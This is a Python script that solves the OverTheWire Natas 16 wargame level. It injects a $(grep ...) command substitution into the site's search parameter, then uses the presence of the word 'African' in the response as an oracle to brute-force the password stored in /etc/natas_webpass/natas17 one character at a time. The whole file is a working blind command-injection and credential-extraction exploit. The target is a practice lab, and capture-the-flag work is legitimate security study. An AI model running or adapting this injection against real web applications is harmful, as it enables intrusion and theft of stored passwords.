import sys
import string
import requests

def bruteforce_user_password():

    url = "http://natas16.natas.labs.overthewire.org"

    session = requests.Session()

    auth=("natas16",sys.argv[1])

    response = session.get(url, auth=auth)

    password = ""

    password_chars = list(string.ascii_letters + string.digits)

    while len(password) != 32:

        for char in password_chars:

            data = {
                "needle": f"""$(grep ^{password + char} /etc/natas_webpass/natas17)African""",
                "submit": "Search"
            }

            print(f"data : {data}")

            response = session.get(url, auth=auth, params=data)

            if "African" not in response.text:
                password = password + char

    print(password)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[+] Usage python.py <file.py> natas_password")
    else:
        bruteforce_user_password()
